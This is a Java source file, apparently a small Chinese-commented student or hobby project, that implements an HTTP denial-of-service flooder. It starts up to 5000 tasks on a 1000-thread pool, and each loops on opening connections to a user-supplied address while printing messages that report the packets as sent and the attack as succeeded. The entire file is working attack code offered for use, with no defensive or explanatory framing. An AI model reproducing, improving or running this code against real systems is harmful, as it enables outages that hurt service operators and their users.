package deal;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

//借鉴网络

public class DoS {
	
	public static DoS dos;
	
	private ExecutorService es = Executors.newFixedThreadPool(1000);
	private Mythread mythread = new Mythread();
	private Thread thread = new Thread(mythread);
//	static String address = DoSPanel.text_address.getText();
//	private int count = Integer.valueOf(DoSPanel.text_thread.getText());
	public static String address;
	private int count = 5000;  //5000个线程
	static boolean isStarta = true;
    
    public DoS(String address) {
        // TODO Auto-generated constructor stub
    	this.address = address;
    	dos = this;
    }
    
    public void run(){
//        ExecutorService es = Executors.newFixedThreadPool(1000);
//        Mythread mythread = new Mythread();
//        Thread thread[] = new Thread[Integer.valueOf(DoSPanel.text_thread.getText())];
    	isStarta = true;
        for(int i = 0;i<count;i++){
            es.execute(thread);
        }
    }
    
    public void stop()
    {
    	isStarta = false;
    	System.out.println("stop!");
    }
    
}
class Mythread implements Runnable {
    public void run() {
        while(DoS.isStarta){
            try {
                URL url = new URL(DoS.address);
                URLConnection conn = url.openConnection();
                System.out.println("发包成功！");
                BufferedInputStream bis = new BufferedInputStream(conn.getInputStream());
                byte[] bytes = new byte[1024];
                int len = -1;
                StringBuffer sb = new StringBuffer();
                
                    if(bis != null){
                        if((len = bis.read()) != -1){
                            sb.append(new String (bytes,0,len));
                            System.out.println(DoS.address);
                            System.out.println("攻击成功！");
//                            System.out.println(DoSPanel.text_address.getText());
                            bis.close();
                        }
                    }                    
            } catch (MalformedURLException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            
        }
    }
}
